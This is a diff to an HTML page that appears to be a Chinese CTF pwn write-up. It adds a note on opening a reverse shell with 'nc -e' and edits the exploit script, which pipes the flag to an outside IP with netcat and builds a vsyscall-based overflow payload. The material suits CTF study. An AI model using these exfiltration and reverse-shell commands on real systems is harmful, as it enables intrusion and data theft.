@@ -454,6 +454,14 @@ pwndbg&gt; x/5i 0xffffffffff600000
 
 <p>还要注意的是, 程序的 stdout 被关掉了, 这个和 0ctf2018 的 babystack 类似, 可以使用 <code>cat flag| nc ip port</code> 的方式在公网 vps 上监听到(<code>nc -l -p port</code>)</p>
 
+<p>或者使用 <code>&gt;&amp;2 &lt;&amp;2 nc -e ip port</code> 来建立一个反向 shell, 原理可以参考</p>
+
+<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
+
+<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+
+<p>讲的很清楚</p>
+
 <h4 id="exp-1">exp</h4>
 
 <p>最终的 exp 如下, 其中的一些细节调试一遍会更加清楚</p>
@@ -502,7 +510,7 @@ io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34
 </span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
     vsyscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffff600000</span>
     cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat flag| nc 123.207.141.87 9999 ;&#34;</span>
-    <span style="color:#75715e">#  cmd = &#34;/bin/sh &lt;&amp;2 &gt;&amp;2\0&#34;</span>
+    <span style="color:#75715e">#  cmd = &#34;&lt;&amp;2 &gt;&amp;2 nc -e ip port;&#34;</span>
     payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x7f</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> cmd 
     payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xE0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p64(vsyscall) <span style="color:#f92672">*</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x3a</span><span style="color:#e6db74">&#39;</span>
 
